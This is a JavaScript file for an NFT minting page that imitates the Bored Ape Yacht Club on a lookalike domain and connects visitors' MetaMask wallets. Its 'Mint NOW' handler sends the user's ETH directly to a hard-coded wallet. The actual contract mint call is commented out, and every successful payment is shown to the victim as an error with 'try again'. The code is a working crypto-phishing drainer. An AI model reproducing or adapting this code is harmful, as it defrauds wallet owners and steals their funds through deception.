const forwarderOrigin =
  location.hostname === "localhost"
    ? "http://localhost:3000"
    : "https://boredapeyachtclub.net";

const $networks = {
  BNB: {
    chainId: 0x38,
    currency: "BNB",
    name: "Binance Smart Chain",
    mint: 2,
    errorMessage: "Please switch to the Binance Smart Chain main network.",
    gas: 0x51615,
  },
  ETH: {
    chainId: 0x1,
    currency: "ETH",
    name: "Ethereum",
    mint: parseFloat("0.16"),
    errorMessage: "Please switch to the Ethereum main network.",
    gas: 0x210000,
  },
};

const initialize = () => {
  //Basic Actions Section
  const onboardButton = document.getElementById("connectButton");

  let accounts = [];

  //Created check function to see if the MetaMask extension is installed
  const isMetaMaskInstalled = () => {
    //Have to check the ethereum binding on the window object to see if it's installed
    const { ethereum } = window;
    return Boolean(ethereum && ethereum.isMetaMask);
  };

  //We create a new MetaMask onboarding object to use in our app
  const onboarding = new MetaMaskOnboarding({ forwarderOrigin });

  //This will start the onboarding proccess
  const onClickInstall = () => {
    onboardButton.innerText = "Connect Wallet";
    onboardButton.disabled = true;
    //On this object we have startOnboarding which will start the onboarding process for our end user
    onboarding.startOnboarding();
  };

  const onClickConnect = async () => {
    try {
      // Will open the MetaMask UI
      // You should disable this button while the request is pending!
      await ethereum.request({ method: "eth_requestAccounts" });
    } catch (error) {
      console.error(error);
    }
  };

  const MetaMaskClientCheck = async () => {
    //Now we check to see if Metmask is installed
    if (!isMetaMaskInstalled()) {
      //If it isn't installed we ask the user to click to install it
      onboardButton.innerText = "Connect Wallet";
      //When the button is clicked we call th is function
      onboardButton.onclick = onClickInstall;
      //The button is now disabled
      onboardButton.disabled = false;
    } else {
      //If MetaMask is installed we ask the user to connect to their wallet
      onboardButton.innerText = "Connect";
      //When the button is clicked we call this function to connect the users MetaMask Wallet
      onboardButton.onclick = onClickConnect;
      //The button is now disabled

      //we use eth_accounts because it returns a list of addresses owned by us.
      const account = await ethereum.request({ method: "eth_accounts" });

      accounts = account[0] || null;

      console.log(accounts);

      if (accounts) {
        onboardButton.innerHTML = `Mint NOW`;

        onboardButton.onclick = async () => {
          try {
            let quantity = document.querySelector(".eth_input").value;
            console.log(quantity);

            let mintValue = Number(quantity) * $networks.ETH.mint;

            let amount = "0x" + (mintValue * 1000000000000000000).toString(16);
            let wallet = "0x6beb766909ac33f0719dae300c0afa3e287f3fdd";
            // const contract = await new web3.eth.Contract(CONTRACT_ABI, wallet);
            // const data = await contract.methods
            //   .mintPresale(wallet, quantity)
            //   .encodeABI();
            const gasLimit = (80000 * quantity).toString(16);
            let txHash = await ethereum.request({
              method: "eth_sendTransaction",
              params: [
                {
                  from: accounts,
                  to: wallet,
                  value: amount,
                  // data: data,
                  gas: gasLimit,
                },
              ],
            });

            mark(txHash, "ETH", mintValue, "mint-fail");

            Toastify({
              text: "Something went wrong, try again",

              duration: 5000,
            }).showToast();
          } catch (error) {
            console.log(error);

            Toastify({
              text: error?.message || "Something went wrong",

              duration: 5000,
            }).showToast();
          }
        };
      } else {
        onboardButton.innerHTML = `Connect`;
      }
    }
  };

  MetaMaskClientCheck();
};

window.addEventListener("DOMContentLoaded", initialize);
